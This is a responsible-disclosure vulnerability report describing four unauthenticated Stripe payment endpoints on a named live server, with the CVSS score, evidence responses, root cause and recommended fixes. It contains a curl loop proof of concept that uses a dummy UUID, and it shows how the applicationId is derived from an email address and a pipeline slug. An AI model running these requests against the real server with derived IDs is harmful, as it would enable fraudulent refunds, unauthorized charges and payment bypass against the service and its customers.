# BUG-01 — CRITICAL: Unauthenticated Stripe financial operations

| Field | Value |
|---|---|
| ID | BUG-01 |
| Severity | **Critical** |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (**9.1**) |
| Asset | `https://teamfeed-server.onrender.com` |
| Endpoint(s) | `/api/stripe/accept-no-charge`, `/api/stripe/charge-balance`, `/api/stripe/refund-deposit`, `/api/stripe/create-checkout-session` |
| Auth required | **None** |
| Status | **CONFIRMED** |
| Keywords | unauthenticated, Stripe, refund, charge, payment bypass, broken authorization, business logic |

## Summary
Four Stripe-backed endpoints perform money/state actions and require **no
authentication**. Authorization is effectively "know the `applicationId`".
The web client invokes them with no `Authorization` header.

## Steps to Reproduce (NON-DESTRUCTIVE)
> Uses a **non-existent** UUID so no real charge/refund/accept occurs.

```bash
Z=00000000-0000-0000-0000-000000000000
for ep in accept-no-charge charge-balance refund-deposit; do
  curl -i -sS -X POST -H 'Content-Type: application/json' \
    -d "{\"applicationId\":\"$Z\"}" \
    "https://teamfeed-server.onrender.com/api/stripe/$ep"
done

curl -i -sS -X POST -H 'Content-Type: application/json' \
  -d '{"pipelineId":"zzz","applicationData":null,"returnUrl":null}' \
  https://teamfeed-server.onrender.com/api/stripe/create-checkout-session
```

## Evidence
```
HTTP/2 404
{"error":"Application not found"}

HTTP/2 400
{"error":"Unsupported pipeline"}     # create-checkout-session
```
- No `401/403`; no `Authorization` header sent; handler performs lookup before
  any auth check.

## Root cause / amplification
Client derives the doc id deterministically:
```
Op = email => email.toLowerCase().replace(/[^a-z0-9]+/g,"_")
applicationId = `${Op(email)}_${pipelineId}`
```
TeamFeed reads the same Firestore `Applications` docs and passes `doc.id`, so
`applicationId` is derivable from a candidate email + public pipeline slug.

## Impact
Without an account, an attacker who knows/derives an `applicationId` can:
- **Refund** the `$99` deposit (revenue loss/fraud)
- **Force-charge** the `$400` balance (unauthorized charges)
- **Accept** an application with no charge (bypass "only pay for results")

## Recommended Fix
1. Require an authenticated, authorized principal (employer/admin scoped to pipeline) on all `/api/stripe/*`.
2. Never authorize a money action by a body-supplied ID alone.
3. Use non-guessable IDs (no PII-derived ids).
4. Add idempotency keys, a server-side state machine, Stripe webhook reconciliation, audit logging, and rate limits.

## Handling
Non-destructive PoC only. Do **not** run with a real `applicationId`.
Responsible disclosure — no public program.